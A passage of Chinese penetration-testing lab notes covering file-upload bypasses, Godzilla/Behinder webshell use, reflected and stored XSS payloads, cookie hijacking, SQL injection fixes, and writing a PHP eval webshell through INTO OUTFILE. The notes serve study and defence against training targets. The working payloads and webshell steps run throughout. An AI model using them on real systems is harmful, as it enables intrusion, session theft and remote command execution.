array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //收尾去空\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件不允许上传!';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n设置了黑名单，并且几乎所有文件都被进行了限制，可以先上传一个.htaccess文件，这个文件生效于当前目录，并且写入SetHandler application/x-httpd-php，这个配置会将该目录下的所有文件都当作php来解析，重启apache\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261645691.png)\n\n然后将php文件改后缀为png文件上传\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261646063.png)\n\n然后访问该文件\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261649608.png)\n\n成功解析！！！\n\n#### ⑤pass-10\n\n源码\n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\");\n\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = str_ireplace($deny_ext,\"\", $file_name);\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = UPLOAD_PATH.'/'.$file_name;        \n        if (move_uploaded_file($temp_file, $img_path)) {\n            $is_upload = true;\n        } else {\n            $msg = '上传出错！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n设置了黑名单，并且限制几乎所有文件，但是进行字符过滤的时候，是将匹配到的字符无论大小写都替换为空，所以可以进行双写绕过\n\n抓包进行上传，将文件名后缀改为pphphp\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261654240.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261656772.png)\n\n### 2、文件上传防御函数\n\n编写php代码\n\n```PHP\n<?php\n\nheader('Content-Type: text/html; charset=utf-8'); \n// 定义deldot函数，删除文件末尾的点\nfunction deldot($s){\n    for($i = strlen($s)-1;$i>0;$i--){\n        $c = substr($s,$i,1);\n        if($i == strlen($s)-1 and $c != '.'){\n            return $s;\n        }\n\n        if($c != '.'){\n            return substr($s,0,$i+1);\n        }\n    }\n}\n\n$test=$_GET['test'];\necho check($test);\n\nfunction check($k){\n        //黑名单策略\n\t\t$deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $deny_ext1 = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"php1\",\"html\",\"htm\",\"phtml\",\"pht\",\"pHp\",\"pHp5\",\"pHp4\",\"pHp3\",\"pHp2\",\"pHp1\",\"Html\",\"Htm\",\"pHtml\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"jSp\",\"jSpx\",\"jSpa\",\"jSw\",\"jSv\",\"jSpf\",\"jHtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"aSp\",\"aSpx\",\"aSa\",\"aSax\",\"aScx\",\"aShx\",\"aSmx\",\"cEr\",\"sWf\",\"swf\",\"htaccess\");\n\t\t$file_name = trim($k);//首尾去空\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');//保留文件后缀\n        $file_ext = strtolower($file_ext); //转换为小写,防御大小写绕过\n        $file_ext = str_ireplace($deny_ext1,'forbid', $file_ext);//防御双写绕过\n\t\t$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n\n        if(!in_array($file_ext, $deny_ext) && strpos($file_ext,'forbid')==false) {\n            //文件重命名，防御解析漏洞利用\n            echo \"成功上传\".date(\"YmdHis\").rand(1000,9999).$file_ext;            \n        } else {\n            echo \"禁止上传该后缀文件！！\";\n        }\n}\n\n?>\n```\n\n测试\n\n```\nshell.pHP\\shell.jsjspp\\shell.pHp.adb.woqoj.dddl\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261858994.png)\n\n成功防御大小写\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261859827.png)\n\n成功防御双写\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261902408.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261903195.png)\n\n虽然上传成功，但是进行了重命名，并且无法上传.htaccess，shell无法被利用\n\n### 3、waf绕过，上传一句话木马\n\n利用脏数据进行绕过\n\n使用yakit进行抓包，手动劫持，客户端上传文件\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261937907.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261938103.png)\n\n通过脏数据进行绕过，在form-data后面加，然后发送\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261940008.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261942449.png)\n\n成功绕过waf\n\n### 4、哥斯拉管理webshell以及上传内存马\n\n#### ①在攻击机使用哥斯拉生成木马\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261945839.png)\n\n选择java，并生成到桌面\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261957280.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261959634.png)\n\n#### ②将shell复制到靶机的www目录下\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508262000125.png)\n\n#### ③哥斯拉连接木马\n\n添加目标\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508262001589.png)\n\nurl选择上传文件落地的地址，有效载荷选择和木马一样的\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508262003494.png)\n\n测试连接，成功则进行添加\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508262004744.png)\n\n进去看看，右键，进入\n\n里面有相当多的功能\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508262005951.png)\n\n接着生成内存马，选择memoryshell板块，设置文件名，不要后缀\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508262007194.png)\n\n生成成功后去进行连接，还是和上传的shell设置一样\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508262010134.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508262011226.png)\n\n并且内存马是活动在内存，并不会落地到磁盘，除非使用特定的内存管理工具才能看见\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508262012010.png)\n\n靶机目录没有落地文件\n\n### 5、冰蝎webshell管理工具\n\n生成木马，先点击传输协议，再选择你想用的协议，然后生成服务端，则会生成木马文件\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508262034462.png)\n\n木马文件默认未shell名字，可以自己更改\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508262035352.png)\n\n然后将木马文件上传到靶机服务器网站根目录下\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508262036244.png)\n\n最后进行连接\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508262037723.png)\n\n然后双击进入\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508262037779.png)\n\n成功\n\n## 扩展\n\n### php语言中命令执行和代码执行的函数\n\n##### 命令执行函数\t\n\n- exec()：命令输出的最后一行，完整输出可存入 $output 数组，需要手动处理输出数组\n\n- shell_exec()：完整的命令输出字符串\n\n- system()：命令输出的最后一行，并直接打印结果，直接输出结果，并可获取状态码\n\n- passthru()：无返回值，直接输出原始命令结果（如二进制数据）\n\n##### 代码执行函数\t\n\n- eval()：执行字符串中的PHP代码，返回NULL或代码中的返回值，可执行任意PHP代码\n- assert()：判断断言是否为false，执行字符串代码\t也可执行字符串代码\n- preg_replace()：执行替换后的字符串（当使用/e修饰符时）\n- create_function()：创建一个匿名函数\n\n"},{"title":"渗透测试-xss注入","url":"/2025/08/20/渗透测试-xss注入/","content":"\n\n\n### 1、反射型xss\n\n恶意脚本作为请求的一部分（通常藏在URL参数中）发送给服务器，服务器在未经验证的情况下直接将包含恶意脚本的响应返回给用户的浏览器。浏览器执行该脚本。\n\n#### ①low\n\n输入payload\n\n```\n<script>alert('xss')</script>\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251544337.png)\n\n点击submit\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251544295.png)\n\n成功弹窗！！！\n\n#### ②medium\n\n源码\n\n```php\n<?php\n\nheader (\"X-XSS-Protection: 0\");\n\n// Is there any input?\nif( array_key_exists( \"name\", $_GET ) && $_GET[ 'name' ] != NULL ) {\n    // Get input\n    $name = str_replace( '<script>', '', $_GET[ 'name' ] );\n    // Feedback for end user\n    echo \"<pre>Hello ${name}</pre>\";\n}\n\n?>\n```\n\n将匹配到的<script>替换为空\n\npayload\n\n```javascript\n//双写\n<scr<script>ipt>alert('xss')</script>\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251550656.png)\n\n```javascript\n//大小写\n<SCript>alert('xss')</SCript>\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251551061.png)\n\n```\n//既然不让用script标签，就换标签\n<img src=1 onerror=\"alert('xss')\">\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251554002.png)\n\n成功弹窗！！！\n\n#### ③high\n\n源码\n\n```php\n<?php\n\nheader (\"X-XSS-Protection: 0\");\n\n// Is there any input?\nif( array_key_exists( \"name\", $_GET ) && $_GET[ 'name' ] != NULL ) {\n    // Get input\n    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );\n\n    // Feedback for end user\n    echo \"<pre>Hello ${name}</pre>\";\n}\n\n?>\n```\n\n对匹配到的<script>字符串进行多次过滤，并且大小写不敏感，所以不能使用大小写和双写绕过\n\npayload\n\n```\n//img标签\n<img src=1 onerror=\"alert('xss')\">\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251559262.png)\n\n成功弹窗！！！\n\n### 2、三种XSS漏洞以及三者的区别\n\n#### ①反射型\n\n反射型xss将输入的数据，经过后端处理后，返回到前端代码中，属于一次性攻击，下一次访问时不会触发，如搜索框\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251606020.png)\n\n#### ②存储型\n\n存储型xss将输入的数据保存在数据库里，再返回到前端代码里，属于持久性攻击，下一次访问时会从数据库调取资源导致触发，如留言板\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251610571.png)\n\n提交数据保存\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251610551.png)\n\n然后去到其他页面，再重新访问这个页面\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251611044.png)\n\n#### ③dom型\n\nDOM 型 XSS 攻击不同于传统的存储型 XSS，它发生在客户端，不经过服务器，通过操作 DOM 实现攻击，如url，输入框\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251613471.png)\n\n### 3、xss-lab1-8实战\n\n#### ①lab1\n\n```php+HTML\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"name\"];\necho \"<h2 align=center>欢迎用户\".$str.\"</h2>\";\n?>\n```\n\n并未做任何防护措施，直接将用户的输入返回，直接构造xss语句\n\n```javascript\n<script>alert('xss')</script>\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251621015.png)\n\n成功弹窗！！！\n\n#### ②lab2\n\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level2.php method=GET>\n<input name=keyword  value=\"'.$str.'\">\n<input type=submit name=submit value=\"搜索\"/>\n</form>\n</center>';\n?>\n```\n\n虽然将第一个回显位进行了html实体编码处理，但是第二个回显位未进行处理，可以在第二个回显位做文章\n\n```html\n<input name=keyword  value=\"'.$str.'\">\n由于value是使用双引号包裹字符的，所以构造\">与前面进行闭合\npayload：\"><script>alert('xss')</script>\n构造完之后代码拼接为\n<input name=keyword  value=\"\"><script>alert('xss')</script>\">\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251626427.png)\n\n成功弹窗！！！\n\n#### ③lab3\n\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".\"<center>\n<form action=level3.php method=GET>\n<input name=keyword  value='\".htmlspecialchars($str).\"'>\n<input type=submit name=submit value=搜索 />\n</form>\n</center>\";\n?>\n```\n\n此处对两个回显位都做了实体编码，实体编码默认情况下会对& \" < >这四个符号进行编码，但是默认情况不对 ' 进行编码\n\n对第二个回显位进行构造\n\n```html\n<input name=keyword  value='\".htmlspecialchars($str).\"'>\n构造鼠标点击事件，由于是使用'包裹字符，所以使用'进行闭合\npayload：' onclick='alert(/xss/)\n构造完之后代码拼接为\n<input name=keyword  value='' onclick='alert(/xss/)'>\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251636707.png)\n\n成功弹窗！！！\n\n#### ④lab4\n\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str2=str_replace(\">\",\"\",$str);\n$str3=str_replace(\"<\",\"\",$str2);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level4.php method=GET>\n<input name=keyword  value=\"'.$str3.'\">\n<input type=submit name=submit value=搜索 />\n</form>\n</center>';\n?>\n```\n\n这里对<>进行了过滤，并且在第一个回显位做了实体编码，但是第二个回显位没做实体编码\n\n```html\n<input name=keyword  value=\"'.$str3.'\">\n可以再此使用上一关payload，但是这里用的是双引号包裹字符串，做一下变换\npayload：\" onclick=\"alert(/xss/)\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251642689.png)\n\n成功弹窗！！！\n\n#### ⑤lab5\n\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"<script\",\"<scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level5.php method=GET>\n<input name=keyword  value=\"'.$str3.'\">\n<input type=submit name=submit value=搜索 />\n</form>\n</center>';\n?>\n```\n\n这里将输入数据全进行了小写转换，并且过滤了script和on，第一个回显位做了实体编码，第二个回显位未做实体编码，这里需要运用到<a href>标签，这个标签会生成一个超链接\n\n```html\npayload：\"><a href=\"javascript:alert('xss')\">123</a>\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251726374.png)\n\n成功弹窗！！！\n\n#### ⑥lab6\n\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str2=str_replace(\"<script\",\"<scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\n$str4=str_replace(\"src\",\"sr_c\",$str3);\n$str5=str_replace(\"data\",\"da_ta\",$str4);\n$str6=str_replace(\"href\",\"hr_ef\",$str5);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level6.php method=GET>\n<input name=keyword  value=\"'.$str6.'\">\n<input type=submit name=submit value=搜索 />\n</form>\n</center>';\n?>\n```\n\n对script,on,src,data,href进行了过滤，并且在第一个回显位做了实体编码，但是没有大小写敏感，尝试大小写绕过\n\n```\n\"><SCriPt>alert('xss')</ScRIpt>\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251710805.png)\n\n#### ⑦lab7\n\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str =strtolower( $_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"\",$str);\n$str3=str_replace(\"on\",\"\",$str2);\n$str4=str_replace(\"src\",\"\",$str3);\n$str5=str_replace(\"data\",\"\",$str4);\n$str6=str_replace(\"href\",\"\",$str5);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level7.php method=GET>\n<input name=keyword  value=\"'.$str6.'\">\n<input type=submit name=submit value=搜索 />\n</form>\n</center>';\n?>\n```\n\n这里做了小写转换，并且将匹配的字符串替换为空，尝试进行双写绕过\n\n```\n\"><scriscriptpt>alert('xss')</scrscriptipt>\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251715187.png)\n\n成功弹窗！！！\n\n#### ⑧lab8\n\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\n$str4=str_replace(\"src\",\"sr_c\",$str3);\n$str5=str_replace(\"data\",\"da_ta\",$str4);\n$str6=str_replace(\"href\",\"hr_ef\",$str5);\n$str7=str_replace('\"','&quot',$str6);\necho '<center>\n<form action=level8.php method=GET>\n<input name=keyword  value=\"'.htmlspecialchars($str).'\">\n<input type=submit name=submit value=添加友情链接 />\n</form>\n</center>';\n?>\n```\n\n这里将输入数据全进行了小写转换，并且过滤了许多字符串并且做了实体编码，这里将输入内容生成了个超链接\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251723465.png)\n\nhref标签特性，当点击超链接时，浏览器会自动对16进制实体编码进行解析，但输入数据时，服务器未做解析，所以就可以绕过后端代码的过滤处理，最后点击链接\n\n```\n将javascript:alert(/xss/)进行16进制实体编码:&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x2f;&#x78;&#x73;&#x73;&#x2f;&#x29;\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251724618.png)\n\n成功弹窗！！！\n\n### 4、xss防御手段\n\n```php\n//实体编码，防御< > \" &，默认情况不防御'\nhtmlspecialchars()\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251731934.png)\n\n```php\n//字符串替换，将匹配到的字符串替换为定义的字符串\nstr_replace(\"匹配的字符串\",\"定义的字符串\",$str)\n//示例，将字符串<script，替换为<scr_ipt\n$str2=str_replace(\"<script\",\"<scr_ipt\",$str);\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251734294.png)\n\n```php\n//将字符串全转换为小写\nstrtolower()\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251739090.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251740180.png)\n\n### 5、xss盲打\n\nxss盲打需要存在存储型xss，并且是普通用户进行输入，管理员进行查看，如意见反馈\n\n在客户端页面的xss盲打表单中输入xss语句，点击提交\n\n```\npayload：<script>alert('xss')</script>\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251749000.png)\n\n进入后台，进行登录，账号admin，密码123456\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251750228.png)\n\n提交登录时发生了弹窗\n\n## 扩展\n\n### cookie劫持\n\n用户输入端构造xss语句，点击提交\n\n```\npayload：<script>alert(document.cookie)</script>\n\ndocument.cookie//将cooike值保存为文档\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251754974.png)\n\n后台端刷新页面，成功弹出cookie，将cookie复制下来\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251755504.png)\n\n新开个浏览器进入后台登录页面，得使用同款浏览器，不然ua头不对可能导致失败\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251757461.png)\n\n打开F12，进入存储，新建cookie，将刚才的cookie复制进去\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251824982.png)\n\n输入后台的url地址，然后回车\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508251825106.png)\n\n成功进入管理员端\n"},{"title":"渗透测试-sql注入(3)","url":"/2025/08/19/渗透测试-sql注入(3)/","content":"\n### 1、修复sqli-lab靶场的宽字节注入、万能密码、二次注入、堆叠注入\n\n#### ①宽字节注入修复\n\n原代码\n\n```php\n<?php\n//including the Mysql connect parameters.\ninclude(\"../sql-connections/sql-connect.php\");\n\nfunction check_addslashes($string)\n{\n    $string = preg_replace('/'. preg_quote('\\\\') .'/', \"\\\\\\\\\\\\\", $string);          //escape any backslash\n    $string = preg_replace('/\\'/i', '\\\\\\'', $string);                               //escape single quote with a backslash\n    $string = preg_replace('/\\\"/', \"\\\\\\\"\", $string);                                //escape double quote with a backslash\n      \n    \n    return $string;\n}\n\n// take the variables \nif(isset($_GET['id']))\n{\n$id=check_addslashes($_GET['id']);\n//echo \"The filtered request is :\" .$id . \"<br>\";\n\n//logging the connection parameters to a file for analysis.\n$fp=fopen('result.txt','a');\nfwrite($fp,'ID:'.$id.\"\\n\");\nfclose($fp);\n\n// connectivity \n\nmysql_query(\"SET NAMES gbk\");//使用了GBK编码\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n\n\tif($row)\n\t{\n  \techo '<font color= \"#00FF00\">';\t\n  \techo 'Your Login name:'. $row['username'];\n  \techo \"<br>\";\n  \techo 'Your Password:' .$row['password'];\n  \techo \"</font>\";\n  \t}\n\telse \n\t{\n\techo '<font color= \"#FFFF00\">';\n\tprint_r(mysql_error());\n\techo \"</font>\";  \n\t}\n}\n\telse { echo \"Please input the ID as parameter with numeric value\";}\n        \n        \n\n?>\n```\n\n将mysql_query(\"SET NAMES gbk\");删除，不设置连接字符集为gbk\n\n测试输入\n\n```sql\n?id=1%db' and 1=2 --+\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508221634520.png)\n\n成功将‘按原计划进行了转义处理，防止了宽字节注入\n\n#### ②万能密码修复\n\n原代码\n\n```php\n    $uname=$_POST['uname'];\n\t$passwd=$_POST['passwd'];\n\n\t//logging the connection parameters to a file for analysis.\n\t$fp=fopen('result.txt','a');\n\tfwrite($fp,'User Name:'.$uname);\n\tfwrite($fp,'Password:'.$passwd.\"\\n\");\n\tfclose($fp);\n\n\n\t// connectivity \n\t@$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\";\n\t$result=mysql_query($sql);\n\t$row = mysql_fetch_array($result);\n\n```\n\n将代码改为\n\n```php\nfunction check($string) {\n    // 使用preg_replace匹配除了字母和数字以外的所有字符，并替换为空\n    return preg_replace('/[^a-zA-Z0-9]/', '', $string);\n}\n\n  $checkname=check($uname);\n\t// connectivity \n\t@$sql=\"SELECT username, password FROM users WHERE username='$checkname' and password='$passwd' LIMIT 0,1\";\n\t$result=mysql_query($sql);\n\t$row = mysql_fetch_array($result);\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508221651330.png)\n\n成功防御\n\n#### ③二次注入\n\n原代码\n\n```php\nif (isset($_POST['submit']))\n{\n\t\n\t\n\t# Validating the user input........\n\t$username= $_SESSION[\"username\"];\n\t$curr_pass= mysql_real_escape_string($_POST['current_password']);\n\t$pass= mysql_real_escape_string($_POST['password']);\n\t$re_pass= mysql_real_escape_string($_POST['re_password']);\n\t\n```\n\n改为\n\n```php\nfunction check($string) {\n    // 使用preg_replace匹配' \" # 进行转义处理\n    $string = preg_replace('/\\'/i', '\\\\\\'', $string);                               //escape single quote with a backslash\n    $string = preg_replace('/\\\"/', \"\\\\\\\"\", $string);  \n    $string = preg_replace('/\\#/', \"\\\\\\#\", $string); \n    return $string; \n}\n\t# Validating the user input........\n\t$username= check($_SESSION[\"username\"]);\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508221714309.png)\n\n进行修改密码\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508221715305.png)\n\n并未修改admin账户的密码，成功防止注入\n\n#### ④堆叠注入\n\n原代码\n\n```php\nif (mysqli_multi_query($con1, $sql))\n{\n    \n    \n    /* store first result set */\n    if ($result = mysqli_store_result($con1))\n    {\n        if($row = mysqli_fetch_row($result))\n        {\n            echo '<font size = \"5\" color= \"#00FF00\">';\t\n            printf(\"Your Username is : %s\", $row[1]);\n            echo \"<br>\";\n            printf(\"Your Password is : %s\", $row[2]);\n            echo \"<br>\";\n            echo \"</font>\";\n        }\n//            mysqli_free_result($result);\n    }\n```\n\n原代码使用了mysqli_multi_query，这个允许执行多条sql语句\n\n```php\n//添加\n// 防御堆叠注入，过滤分号及其编码形式和其他可能的语句分隔符\n$id = preg_replace('/;|%3B|%3b|\\x3B|%0D|%0A|\\r|\\n/', '', $id);\n\n// 验证ID是否为数字\nif(!is_numeric($id)) {\n    die('请输入数字');\n}\n```\n\n测试\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508221816487.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508221817584.png)\n\n注入失败，并未插入数据，防御成功\n"},{"title":"渗透测试-sql注入(2)","url":"/2025/08/18/渗透测试-sql注入(2)/","content":"\n\n\n### 1、手工注入的方式写入一句话木马\n\n一句话木马\n\n```php\n<?php @eval($_GET['abc']);?>\n```\n\n利用sql注入webshell\n\n```\n//条件\n当前连接数据库用户为root\n知道写入绝对路径\nsecure_file_priv配置，并且为空\n```\n\n进入靶场mysql配置文件my.ini，mysql默认不配置这个选项，需要手动加进去,一般secure_file_priv在后面的版本应该写在[mysqld]这一栏下\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508211808963.png)\n\n绝对路径一般靠猜，比如linux系统的var/www/html，Windows系统的inetpub\\wwwroot、\n\n既然存在sql注入，可以利用sql注入查看数据库路径来猜测网站路径\n\n```\n?id=-1' union select 1,2,@@datadir --+\n@@datadir 是一个 MySQL 系统变量，用于显示 MySQL 服务器将数据文件存储在哪一个目录路径下。简单来说，它就是 MySQL 的“数据仓库”或“数据家园”的位置\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508211833205.png)\n\n得知mysql在c盘下的C:\\XAMPP2\\mysql\\data\\，一般Windows系统启用apache时web通常在Apache24\\htdocs这个目录下，根据url显示的sqli-labs，猜测目录是C:\\Apache24\\htdocs\\sqli-labs这个目录，由于靶场使用的是XAMPP部署网站，这里靶场实际目录是C:\\XAMPP2\\htdocs\\sqli-labs\\\n\n查看当前连接的用户\n\n```sql\n?id=-1' union select 1,2,user() --+\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508211844468.png)\n\n由此可以进行写入webshell\n\n```sql\n//函数\ninto outfile\ninto dumpfile\n```\n\n进入靶场，url输入\n\n```sql\n?id=1' union select 0x3c3f70687020406576616c28245f4745545b27616263275d293b3f3e into outfile 'C:\\XAMPP2\\htdocs\\sqli-labs\\shell.php' --+\n\n0x3c3f70687020406576616c28245f4745545b27616263275d293b3f3e为16进制编码，前面的0x让服务器识别这是16进制\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508211821458.png)\n\n页面无正常回显，看看目录下\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508211822751.png)\n\n成功写入，我们去浏览器访问这个文件，并输入\n\n```\n?adc=system(ipconfig);\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508211829538.png)\n\n成功注入，拿到权限\n\n### 2、sqlmap工具--os-shell\n\n自动化写入webshell，利用sqlmap\n\n来到一个存在sql注入的地方\n\n获取url，然后发给sqlmap\n\n```bash\nsqlmap -u 